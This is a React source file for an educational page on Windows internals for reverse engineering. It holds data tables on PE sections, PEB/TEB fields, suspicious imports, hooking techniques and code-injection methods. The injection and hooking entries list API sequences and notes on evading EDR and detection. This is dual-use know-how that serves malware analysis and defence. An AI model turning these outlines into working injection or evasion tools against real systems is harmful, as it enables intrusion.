                <Chip label={`Q${index + 1}`} size="small" sx={{ bgcolor: isCorrect ? "#22c55e" : "#ef4444", color: "white", fontWeight: 700 }} />
                <Typography variant="body2" sx={{ fontWeight: 600 }}>{q.question}</Typography>
              </Box>
              <Typography variant="body2" sx={{ color: "text.secondary", ml: 4.5 }}>
                <strong>Your answer:</strong> {q.options[userAnswers[q.id]] || "Not answered"}
                {!isCorrect && (<><br /><strong style={{ color: "#22c55e" }}>Correct:</strong> {q.options[q.correctAnswer]}</>)}
              </Typography>
              {!isCorrect && (<Alert severity="info" sx={{ mt: 1, ml: 4.5 }}><Typography variant="caption">{q.explanation}</Typography></Alert>)}
            </Paper>
          );
        })}

        <Box sx={{ display: "flex", gap: 2, mt: 3 }}>
          <Button variant="contained" onClick={startQuiz} startIcon={<RefreshIcon />} sx={{ background: "linear-gradient(135deg, #3b82f6, #2563eb)", fontWeight: 700 }}>Try Again</Button>
          <Button variant="outlined" onClick={() => setQuizStarted(false)} sx={{ fontWeight: 600 }}>Back to Overview</Button>
        </Box>
      </Paper>
    );
  }

  const currentQuestion = currentQuestions[currentQuestionIndex];
  const answeredCount = Object.keys(userAnswers).length;

  return (
    <Paper id="quiz-section" sx={{ p: 4, mb: 5, borderRadius: 4, bgcolor: alpha(theme.palette.background.paper, 0.6), border: `2px solid ${alpha("#3b82f6", 0.3)}` }}>
      <Box sx={{ mb: 3 }}>
        <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
          <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Question {currentQuestionIndex + 1} of 10</Typography>
          <Chip label={currentQuestion.topic} size="small" sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }} />
        </Box>
        <Box sx={{ width: "100%", bgcolor: alpha("#3b82f6", 0.1), borderRadius: 1, height: 8 }}>
          <Box sx={{ width: `${((currentQuestionIndex + 1) / 10) * 100}%`, bgcolor: "#3b82f6", borderRadius: 1, height: "100%", transition: "width 0.3s ease" }} />
        </Box>
      </Box>

      <Typography variant="h6" sx={{ fontWeight: 700, mb: 3, lineHeight: 1.6 }}>{currentQuestion.question}</Typography>

      <Grid container spacing={2} sx={{ mb: 4 }}>
        {currentQuestion.options.map((option, index) => {
          const isSelected = userAnswers[currentQuestion.id] === index;
          return (
            <Grid item xs={12} key={index}>
              <Paper
                onClick={() => handleAnswerSelect(currentQuestion.id, index)}
                sx={{ p: 2, borderRadius: 2, cursor: "pointer", bgcolor: isSelected ? alpha("#3b82f6", 0.15) : alpha(theme.palette.background.paper, 0.5), border: `2px solid ${isSelected ? "#3b82f6" : alpha(theme.palette.divider, 0.2)}`, transition: "all 0.2s ease", "&:hover": { borderColor: "#3b82f6", bgcolor: alpha("#3b82f6", 0.08) } }}
              >
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Box sx={{ width: 32, height: 32, borderRadius: "50%", bgcolor: isSelected ? "#3b82f6" : alpha(theme.palette.divider, 0.3), color: isSelected ? "white" : "text.secondary", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 700, fontSize: "0.9rem" }}>
                    {String.fromCharCode(65 + index)}
                  </Box>
                  <Typography variant="body1" sx={{ fontWeight: isSelected ? 600 : 400 }}>{option}</Typography>
                </Box>
              </Paper>
            </Grid>
          );
        })}
      </Grid>

      <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
        <Button variant="outlined" disabled={currentQuestionIndex === 0} onClick={() => setCurrentQuestionIndex((prev) => prev - 1)}>Previous</Button>
        <Typography variant="body2" color="text.secondary">{answeredCount}/10 answered</Typography>
        {currentQuestionIndex < 9 ? (
          <Button variant="contained" onClick={() => setCurrentQuestionIndex((prev) => prev + 1)} sx={{ background: "linear-gradient(135deg, #3b82f6, #2563eb)" }}>Next</Button>
        ) : (
          <Button variant="contained" onClick={() => setShowResults(true)} disabled={answeredCount < 10} sx={{ background: answeredCount >= 10 ? "linear-gradient(135deg, #22c55e, #16a34a)" : undefined, fontWeight: 700 }}>Submit Quiz</Button>
        )}
      </Box>
    </Paper>
  );
}

// Section navigation items
const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <InfoIcon fontSize="small" /> },
  { id: "pe-format", label: "PE File Format", icon: <StorageIcon fontSize="small" /> },
  { id: "teb-peb", label: "TEB/PEB", icon: <AccountTreeIcon fontSize="small" /> },
  { id: "api-patterns", label: "API Patterns", icon: <AppsIcon fontSize="small" /> },
  { id: "hooking", label: "Hooking", icon: <LayersIcon fontSize="small" /> },
  { id: "injection", label: "Code Injection", icon: <BugReportIcon fontSize="small" /> },
  { id: "anti-debug", label: "Anti-Debug", icon: <LockIcon fontSize="small" /> },
  { id: "tools", label: "RE Tools", icon: <TerminalIcon fontSize="small" /> },
  { id: "quiz", label: "Quiz", icon: <QuizIcon fontSize="small" /> },
];

interface CodeBlockProps {
  title?: string;
  children: string;
}

function CodeBlock({ title, children }: CodeBlockProps) {
  const [copied, setCopied] = useState(false);
  const theme = useTheme();

  const handleCopy = () => {
    navigator.clipboard.writeText(children);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper sx={{ mt: 2, mb: 2, overflow: "hidden", border: `1px solid ${alpha(theme.palette.primary.main, 0.2)}` }}>
      {title && (
        <Box sx={{ px: 2, py: 1, bgcolor: alpha(theme.palette.primary.main, 0.1), borderBottom: `1px solid ${alpha(theme.palette.primary.main, 0.2)}`, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <Typography variant="caption" fontWeight="bold" color="primary">{title}</Typography>
          <Tooltip title={copied ? "Copied!" : "Copy"}>
            <IconButton size="small" onClick={handleCopy}><ContentCopyIcon fontSize="small" /></IconButton>
          </Tooltip>
        </Box>
      )}
      <Box component="pre" sx={{ m: 0, p: 2, overflow: "auto", bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#f8f9fa", fontSize: "0.85rem", fontFamily: "monospace" }}>
        <code>{children}</code>
      </Box>
    </Paper>
  );
}

// PE Section data
const peSections = [
  { name: ".text", purpose: "Executable code", characteristics: "IMAGE_SCN_CNT_CODE, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ", notes: "Contains compiled machine code. Look here for main logic." },
  { name: ".data", purpose: "Initialized global/static data", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE", notes: "Global variables with initial values. Config data often here." },
  { name: ".rdata", purpose: "Read-only data, import tables", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_READ", notes: "Constants, vtables, IAT. Critical for understanding imports." },
  { name: ".bss", purpose: "Uninitialized data", characteristics: "IMAGE_SCN_CNT_UNINITIALIZED_DATA, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE", notes: "Zero-initialized at load time. May contain runtime buffers." },
  { name: ".rsrc", purpose: "Resources (icons, strings, manifests)", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_READ", notes: "Embedded files, dialogs, version info. Check for hidden payloads." },
  { name: ".reloc", purpose: "Base relocation table", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_DISCARDABLE, IMAGE_SCN_MEM_READ", notes: "Required for ASLR. Can be stripped from EXEs (not DLLs)." },
  { name: ".idata", purpose: "Import directory", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE", notes: "Import descriptors, thunks. Sometimes merged with .rdata." },
  { name: ".edata", purpose: "Export directory", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_READ", notes: "DLL exports. Usually only in DLLs." },
  { name: ".tls", purpose: "Thread Local Storage", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE", notes: "TLS callbacks execute before main(). Common anti-debug location." },
  { name: ".pdata", purpose: "Exception handling (x64)", characteristics: "IMAGE_SCN_CNT_INITIALIZED_DATA, IMAGE_SCN_MEM_READ", notes: "RUNTIME_FUNCTION structures for SEH on x64." },
];

// Important PE directories
const peDirectories = [
  { index: 0, name: "Export Table", description: "Functions exported by the module (DLLs)", rva: "IMAGE_DIRECTORY_ENTRY_EXPORT", useCase: "Find exported functions, forwarded exports" },
  { index: 1, name: "Import Table", description: "Functions imported from other DLLs", rva: "IMAGE_DIRECTORY_ENTRY_IMPORT", useCase: "Identify dependencies, suspicious imports" },
  { index: 2, name: "Resource Table", description: "Icons, strings, version info, manifests", rva: "IMAGE_DIRECTORY_ENTRY_RESOURCE", useCase: "Extract embedded files, find hidden data" },
  { index: 3, name: "Exception Table", description: "SEH exception handlers (x64)", rva: "IMAGE_DIRECTORY_ENTRY_EXCEPTION", useCase: "Analyze exception handling, find handlers" },
  { index: 4, name: "Security Table", description: "Authenticode digital signatures", rva: "IMAGE_DIRECTORY_ENTRY_SECURITY", useCase: "Verify code signing, check certificate" },
  { index: 5, name: "Base Relocation", description: "Fixups for ASLR when base address changes", rva: "IMAGE_DIRECTORY_ENTRY_BASERELOC", useCase: "Understand ASLR, manual mapping" },
  { index: 6, name: "Debug Directory", description: "Debug info, PDB paths, GUID", rva: "IMAGE_DIRECTORY_ENTRY_DEBUG", useCase: "Find PDB path, download symbols" },
  { index: 9, name: "TLS Table", description: "Thread Local Storage callbacks", rva: "IMAGE_DIRECTORY_ENTRY_TLS", useCase: "Find TLS callbacks (anti-debug)" },
  { index: 10, name: "Load Config", description: "Security features (CFG, SafeSEH)", rva: "IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG", useCase: "Check security mitigations" },
  { index: 11, name: "Bound Import", description: "Pre-bound import addresses", rva: "IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT", useCase: "Legacy optimization, rarely used now" },
  { index: 12, name: "IAT", description: "Import Address Table - resolved pointers", rva: "IMAGE_DIRECTORY_ENTRY_IAT", useCase: "Hook detection, IAT patching" },
  { index: 13, name: "Delay Import", description: "Delayed loading of DLLs", rva: "IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT", useCase: "Find optional dependencies" },
  { index: 14, name: "CLR Header", description: ".NET metadata for managed code", rva: "IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR", useCase: "Detect .NET, find metadata" },
];

// TEB/PEB fields - expanded
const pebFields = [
  { offset: "0x000", offset64: "0x000", field: "InheritedAddressSpace", type: "BOOLEAN", description: "TRUE if process inherited address space from parent" },
  { offset: "0x001", offset64: "0x001", field: "ReadImageFileExecOptions", type: "BOOLEAN", description: "Image file execution options were read" },
  { offset: "0x002", offset64: "0x002", field: "BeingDebugged", type: "BOOLEAN", description: "Anti-debug: 1 if process is being debugged" },
  { offset: "0x003", offset64: "0x003", field: "BitField", type: "BOOLEAN", description: "Flags: ImageUsesLargePages, IsProtectedProcess, etc." },
  { offset: "0x008", offset64: "0x010", field: "ImageBaseAddress", type: "PVOID", description: "Base address where EXE is loaded" },
  { offset: "0x00C", offset64: "0x018", field: "Ldr", type: "PPEB_LDR_DATA", description: "Pointer to loader data (loaded modules list)" },
  { offset: "0x010", offset64: "0x020", field: "ProcessParameters", type: "PRTL_USER_PROCESS_PARAMETERS", description: "Command line, environment, current directory" },
  { offset: "0x018", offset64: "0x030", field: "SubSystemData", type: "PVOID", description: "Subsystem-specific data" },
  { offset: "0x01C", offset64: "0x038", field: "ProcessHeap", type: "PVOID", description: "Default process heap handle" },
  { offset: "0x020", offset64: "0x040", field: "FastPebLock", type: "PRTL_CRITICAL_SECTION", description: "Lock for PEB access synchronization" },
  { offset: "0x068", offset64: "0x0BC", field: "NtGlobalFlag", type: "ULONG", description: "Anti-debug: Debug heap flags (FLG_HEAP_*)" },
  { offset: "0x0A4", offset64: "0x100", field: "NumberOfProcessors", type: "ULONG", description: "Number of logical processors" },
  { offset: "0x0A8", offset64: "0x108", field: "NtMajorVersion", type: "ULONG", description: "Windows major version number" },
  { offset: "0x0AC", offset64: "0x10C", field: "NtMinorVersion", type: "ULONG", description: "Windows minor version number" },
];

const tebFields = [
  { offset: "0x000", offset64: "0x000", field: "NtTib.ExceptionList", type: "PEXCEPTION_REGISTRATION_RECORD", description: "SEH exception chain head (x86 only)" },
  { offset: "0x004", offset64: "0x008", field: "NtTib.StackBase", type: "PVOID", description: "Top of stack (high address)" },
  { offset: "0x008", offset64: "0x010", field: "NtTib.StackLimit", type: "PVOID", description: "Bottom of stack (low address)" },
  { offset: "0x018", offset64: "0x030", field: "NtTib.Self", type: "PTEB", description: "Linear address of TEB itself" },
  { offset: "0x020", offset64: "0x040", field: "ClientId.UniqueProcess", type: "HANDLE", description: "Process ID" },
  { offset: "0x024", offset64: "0x048", field: "ClientId.UniqueThread", type: "HANDLE", description: "Thread ID" },
  { offset: "0x030", offset64: "0x060", field: "ProcessEnvironmentBlock", type: "PPEB", description: "Pointer to PEB" },
  { offset: "0x034", offset64: "0x068", field: "LastErrorValue", type: "ULONG", description: "GetLastError() value" },
  { offset: "0x02C", offset64: "0x058", field: "ThreadLocalStoragePointer", type: "PVOID", description: "TLS array pointer" },
  { offset: "0xF78", offset64: "0x1478", field: "GdiTebBatch", type: "GDI_TEB_BATCH", description: "GDI batching structure" },
  { offset: "0xFB4", offset64: "0x17C8", field: "glDispatchTable", type: "PVOID[233]", description: "OpenGL dispatch table" },
];

// Suspicious imports - expanded with descriptions
const suspiciousImports = [
  { 
    category: "Process Manipulation", 
    apis: ["CreateProcess", "CreateRemoteThread", "CreateRemoteThreadEx", "OpenProcess", "NtOpenProcess", "VirtualAllocEx", "WriteProcessMemory", "ReadProcessMemory", "NtCreateThreadEx", "RtlCreateUserThread", "NtWriteVirtualMemory", "NtReadVirtualMemory"],
    description: "Used for process injection, spawning child processes, and manipulating other processes' memory.",
    severity: "high"
  },
  { 
    category: "Memory Operations", 
    apis: ["VirtualAlloc", "VirtualAllocEx", "VirtualProtect", "VirtualProtectEx", "HeapCreate", "HeapAlloc", "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "ZwAllocateVirtualMemory", "RtlAllocateHeap"],
    description: "Memory allocation with executable permissions (RWX) is a strong indicator of shellcode execution.",
    severity: "high"
  },
  { 
    category: "Registry Persistence", 
    apis: ["RegSetValueEx", "RegSetValueExA", "RegSetValueExW", "RegCreateKeyEx", "NtSetValueKey", "RegOpenKeyEx", "RegDeleteValue", "RegEnumValue", "SHSetValue"],
    description: "Registry modifications for persistence (Run keys, services, COM objects).",
    severity: "medium"
  },
  { 
    category: "DLL/Code Loading", 
    apis: ["LoadLibrary", "LoadLibraryA", "LoadLibraryW", "LoadLibraryEx", "GetProcAddress", "GetModuleHandle", "LdrLoadDll", "LdrGetProcedureAddress", "NtMapViewOfSection", "RtlAddVectoredExceptionHandler"],
    description: "Dynamic API resolution, reflective loading, and DLL injection.",
    severity: "high"
  },
  { 
    category: "File System", 
    apis: ["CreateFile", "WriteFile", "ReadFile", "DeleteFile", "CopyFile", "MoveFile", "NtCreateFile", "NtWriteFile", "NtReadFile", "SetFileAttributes", "FindFirstFile", "FindNextFile"],
    description: "File operations for dropping payloads, exfiltration, or file encryption (ransomware).",
    severity: "medium"
  },
  { 
    category: "Network Communication", 
    apis: ["WSAStartup", "socket", "connect", "send", "recv", "bind", "listen", "accept", "InternetOpen", "InternetConnect", "HttpOpenRequest", "HttpSendRequest", "WinHttpOpen", "WinHttpConnect", "URLDownloadToFile", "getaddrinfo", "gethostbyname"],
    description: "Network operations for C2 communication, data exfiltration, or downloading additional payloads.",
    severity: "high"
  },
  { 
    category: "Cryptography", 
    apis: ["CryptEncrypt", "CryptDecrypt", "CryptAcquireContext", "CryptGenKey", "CryptDeriveKey", "BCryptEncrypt", "BCryptDecrypt", "BCryptGenerateSymmetricKey", "CryptImportKey", "CryptExportKey"],
    description: "Encryption/decryption for ransomware, obfuscation, or secure C2 communication.",
    severity: "medium"
  },
  { 
    category: "Anti-Debug/Anti-VM", 
    apis: ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "NtQueryInformationProcess", "OutputDebugString", "GetTickCount", "QueryPerformanceCounter", "NtQuerySystemInformation", "GetSystemInfo", "NtSetInformationThread"],
    description: "Debugger detection, VM detection, and analysis evasion techniques.",
    severity: "medium"
  },
  {
    category: "Service Manipulation",
    apis: ["OpenSCManager", "CreateService", "OpenService", "StartService", "ControlService", "DeleteService", "ChangeServiceConfig", "EnumServicesStatus"],
    description: "Service-based persistence and privilege escalation.",
    severity: "high"
  },
  {
    category: "Token/Privilege",
    apis: ["OpenProcessToken", "AdjustTokenPrivileges", "DuplicateToken", "ImpersonateLoggedOnUser", "SetThreadToken", "LookupPrivilegeValue", "NtOpenProcessToken"],
    description: "Token manipulation for privilege escalation and impersonation.",
    severity: "high"
  },
];

// Hooking techniques - expanded
const hookingTechniques = [
  { name: "IAT Hooking", description: "Modify Import Address Table entries to redirect imported function calls to malicious code. Effective because IAT is in writable memory after loading.", detection: "Compare IAT entries with on-disk values or export addresses", implementation: "Locate IAT in PE, find target function entry, overwrite with hook address", pros: "Easy to implement, survives function calls", cons: "Easy to detect, limited to imported functions" },
  { name: "Inline/Detours Hooking", description: "Overwrite the first few bytes of a function (prologue) with a JMP to the hook handler. Most common technique used by security tools.", detection: "Check function prologues for JMP/CALL instructions or unexpected bytes", implementation: "Save original bytes, write 5-byte JMP (E9) or 6-byte JMP (FF 25)", pros: "Works on any function, very flexible", cons: "Requires disassembly to handle varying prologue sizes" },
  { name: "EAT Hooking", description: "Modify Export Address Table in a loaded DLL to redirect exported functions. Affects all modules that call the export.", detection: "Compare EAT RVAs with on-disk module exports", implementation: "Parse EAT, find function RVA, replace with hook RVA", pros: "Affects all callers system-wide", cons: "Only works on exports, requires DLL to be loaded first" },
  { name: "SSDT Hooking", description: "Modify System Service Descriptor Table in kernel to intercept system calls. Requires kernel driver but provides powerful interception.", detection: "Compare SSDT entries with ntoskrnl.exe exports, use PatchGuard bypass detection", implementation: "Load kernel driver, locate SSDT, disable write protection (cr0), modify entry", pros: "Intercepts all usermode syscalls", cons: "Requires kernel access, blocked by PatchGuard on x64" },
  { name: "VTable Hooking", description: "Replace virtual function pointers in C++ class vtables. Common for hooking COM objects and DirectX/Windows APIs.", detection: "Validate vtable pointers against known good values in code section", implementation: "Find vtable pointer in object, locate target method index, overwrite pointer", pros: "Targeted, hard to detect without knowing object layout", cons: "Requires C++ objects, vtable location must be known" },
  { name: "Hardware Breakpoints (DR Hooks)", description: "Use debug registers (DR0-DR3) to set hardware breakpoints. Extremely stealthy as no code modification required.", detection: "Check debug register values via GetThreadContext or kernel inspection", implementation: "Use SetThreadContext to configure DR0-3 (address) and DR7 (control)", pros: "No code modification, survives integrity checks", cons: "Limited to 4 hooks, can be detected via DR register inspection" },
  { name: "Page Guard Hooks", description: "Mark memory pages as PAGE_GUARD to trigger exceptions on access. Used for memory access monitoring.", detection: "Check page protections, monitor exception handlers", implementation: "VirtualProtect with PAGE_GUARD, catch EXCEPTION_GUARD_PAGE in VEH", pros: "Monitor memory access patterns", cons: "Performance impact, single-shot (guard cleared after trigger)" },
  { name: "Vectored Exception Handling (VEH)", description: "Register a VEH handler that intercepts exceptions before SEH. Can redirect execution on hardware breakpoints or int3.", detection: "Enumerate VEH chain via ntdll internals", implementation: "AddVectoredExceptionHandler, filter for specific exception codes", pros: "Process-wide, flexible", cons: "Can be enumerated, only catches exceptions" },
];

// DLL injection methods - expanded
const injectionMethods = [
  { name: "CreateRemoteThread + LoadLibrary", description: "Classic method: allocate memory in target, write DLL path, create thread with LoadLibrary as start address.", difficulty: "Easy", detected: "High", apis: "OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread", notes: "Detected by most AVs, thread creation is suspicious" },
  { name: "NtCreateThreadEx", description: "Native API version of CreateRemoteThread. Allows creating suspended/hidden threads.", difficulty: "Medium", detected: "Medium", apis: "NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx", notes: "Slightly stealthier, avoids some usermode hooks" },
  { name: "QueueUserAPC", description: "Queue an APC (Asynchronous Procedure Call) to a thread. Executes when thread enters alertable wait state.", difficulty: "Medium", detected: "Medium", apis: "OpenProcess, VirtualAllocEx, WriteProcessMemory, OpenThread, QueueUserAPC", notes: "Requires alertable thread (SleepEx, WaitForSingleObjectEx, etc.)" },
  { name: "SetWindowsHookEx", description: "Install a system-wide Windows hook. Target DLL is loaded into all processes that match the hook type.", difficulty: "Easy", detected: "High", apis: "SetWindowsHookEx, LoadLibrary", notes: "Noisy, loads into many processes, easy to detect" },
  { name: "AppInit_DLLs Registry", description: "Registry key that specifies DLLs loaded into every process that loads user32.dll.", difficulty: "Easy", detected: "High", apis: "RegSetValueEx", notes: "Persistent, requires admin, easily discovered in registry" },
  { name: "Thread Execution Hijacking", description: "Suspend target thread, modify its context (RIP/EIP) to point to shellcode, resume.", difficulty: "Hard", detected: "Low", apis: "OpenProcess, OpenThread, SuspendThread, GetThreadContext, SetThreadContext, ResumeThread", notes: "No thread creation, harder to detect" },
  { name: "Process Hollowing (RunPE)", description: "Create suspended process, unmap its image, write malicious PE, resume. Process appears legitimate.", difficulty: "Hard", detected: "Medium", apis: "CreateProcess (suspended), NtUnmapViewOfSection, VirtualAllocEx, WriteProcessMemory, SetThreadContext, ResumeThread", notes: "Process looks clean externally, detected by memory scanning" },
  { name: "Process Doppelgänging", description: "Abuse NTFS transactions to create process from transacted file that is never committed to disk.", difficulty: "Expert", detected: "Low", apis: "NtCreateTransaction, CreateFileTransacted, NtCreateSection, NtCreateProcessEx, NtRollbackTransaction", notes: "Very stealthy, no file on disk, Windows 10 RS3+ mitigations" },
  { name: "AtomBombing", description: "Abuse global atom table to write data into target process, then trigger execution via APC.", difficulty: "Hard", detected: "Low", apis: "GlobalAddAtom, NtQueueApcThread, GlobalGetAtomName", notes: "No VirtualAllocEx needed, bypasses some detections" },
  { name: "Early Bird Injection", description: "Inject into process during early initialization before EDR hooks are applied.", difficulty: "Hard", detected: "Low", apis: "CreateProcess (suspended), VirtualAllocEx, WriteProcessMemory, QueueUserAPC (to main thread)", notes: "Executes before EDR, very effective against hooks" },
  { name: "Module Stomping/Overloading", description: "Load legitimate DLL, overwrite its .text section with malicious code. Appears as legitimate module.", difficulty: "Medium", detected: "Low", apis: "LoadLibrary, VirtualProtect, memcpy", notes: "Passes module validation, harder memory forensics" },
  { name: "Ghostwriting", description: "Use ROP chain to make target process allocate and execute shellcode without CreateRemoteThread.", difficulty: "Expert", detected: "Low", apis: "Stack manipulation via suspended thread context modification", notes: "No direct remote code execution APIs" },
];

const WindowsInternalsREPage: React.FC = () => {
  const theme = useTheme();
  const navigate = useNavigate();
  const accent = "#3b82f6";

  // Navigation state
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("");
  const isMobile = useMediaQuery(theme.breakpoints.down("lg"));

  const sectionNavItems = [
    { id: "intro", label: "Introduction", icon: <InfoIcon /> },
    { id: "pe-format", label: "PE File Format", icon: <StorageIcon /> },
    { id: "teb-peb", label: "TEB/PEB", icon: <AccountTreeIcon /> },
    { id: "memory-mgmt", label: "Memory Management", icon: <MemoryIcon /> },
    { id: "syscalls", label: "Syscalls & NTAPI", icon: <SpeedIcon /> },
    { id: "api-patterns", label: "API Patterns", icon: <AppsIcon /> },
    { id: "hooking", label: "Hooking", icon: <LayersIcon /> },
    { id: "injection", label: "Code Injection", icon: <BugReportIcon /> },
    { id: "anti-debug", label: "Anti-Debug", icon: <LockIcon /> },
    { id: "tools", label: "RE Tools", icon: <TerminalIcon /> },
    { id: "quiz", label: "Quiz", icon: <QuizIcon /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  const pageContext = `Windows Internals for Reverse Engineering - Comprehensive guide covering PE file format (DOS header, NT headers, sections, directories, IAT/EAT), Windows process architecture (TEB, PEB, loaded modules), memory management (virtual memory, heaps, stacks), Windows API patterns for malware analysis, DLL injection techniques (CreateRemoteThread, process hollowing, APC injection), hooking methods (IAT, inline, SSDT), anti-debugging techniques and bypasses, kernel structures, and essential RE tools (WinDbg, x64dbg, Process Monitor, API Monitor). Critical knowledge for malware analysis, exploit development, and Windows security research.`;

  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": {
          width: 6,
        },
        "&::-webkit-scrollbar-thumb": {
          bgcolor: alpha(accent, 0.3),
          borderRadius: 3,
        },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography
          variant="subtitle2"
          sx={{ fontWeight: 700, mb: 1, color: accent, display: "flex", alignItems: "center", gap: 1 }}
        >
          <ListAltIcon sx={{ fontSize: 18 }} />
          Contents
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">
              Progress
            </Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
              {Math.round(progressPercent)}%
            </Typography>
          </Box>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 6,
              borderRadius: 3,
              bgcolor: alpha(accent, 0.1),
              "& .MuiLinearProgress-bar": {
                bgcolor: accent,
                borderRadius: 3,
              },
            }}
          />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5,
                mb: 0.25,
                py: 0.5,
                cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                "&:hover": {
                  bgcolor: alpha(accent, 0.08),
                },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem", color: activeSection === item.id ? accent : "text.secondary" }}>{item.icon}</ListItemIcon>
              <ListItemText
                primary={
                  <Typography
                    variant="caption"
                    sx={{
                      fontWeight: activeSection === item.id ? 700 : 500,
                      color: activeSection === item.id ? accent : "text.secondary",
                      fontSize: "0.75rem",
                    }}
                  >
                    {item.label}
                  </Typography>
                }
              />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Windows Internals for RE" pageContext={pageContext}>
      {/* Floating Navigation Button - Mobile Only */}
      <Tooltip title="Navigate Sections" placement="left">
        <Fab
          color="primary"
          onClick={() => setNavDrawerOpen(true)}
          sx={{
            position: "fixed",
            bottom: 90,
            right: 24,
            zIndex: 1000,
            bgcolor: accent,
            "&:hover": { bgcolor: "#2563eb" },
            boxShadow: `0 4px 20px ${alpha(accent, 0.4)}`,
            display: { xs: "flex", lg: "none" },
          }}
        >
          <ListAltIcon />
        </Fab>
      </Tooltip>

      {/* Scroll to Top Button */}
      <Tooltip title="Scroll to Top" placement="left">
        <Fab
          size="small"
          onClick={scrollToTop}
          sx={{
            position: "fixed",
            bottom: 32,
            right: 28,
            zIndex: 1000,
            bgcolor: alpha(accent, 0.15),
            color: accent,
            "&:hover": { bgcolor: alpha(accent, 0.25) },
          }}
        >
          <KeyboardArrowUpIcon />
        </Fab>
      </Tooltip>

      {/* Navigation Drawer - Mobile */}
      <Drawer
        anchor="right"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: {
            width: isMobile ? "85%" : 320,
            bgcolor: theme.palette.background.paper,
            backgroundImage: "none",
          },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: accent }} />
              Contents
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small">
              <CloseIcon />
            </IconButton>
          </Box>

          <Divider sx={{ mb: 2 }} />

          {/* Progress indicator */}
          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">
                Progress
              </Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
                {Math.round(progressPercent)}%
              </Typography>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progressPercent}
              sx={{
                height: 6,
                borderRadius: 3,
                bgcolor: alpha(accent, 0.1),
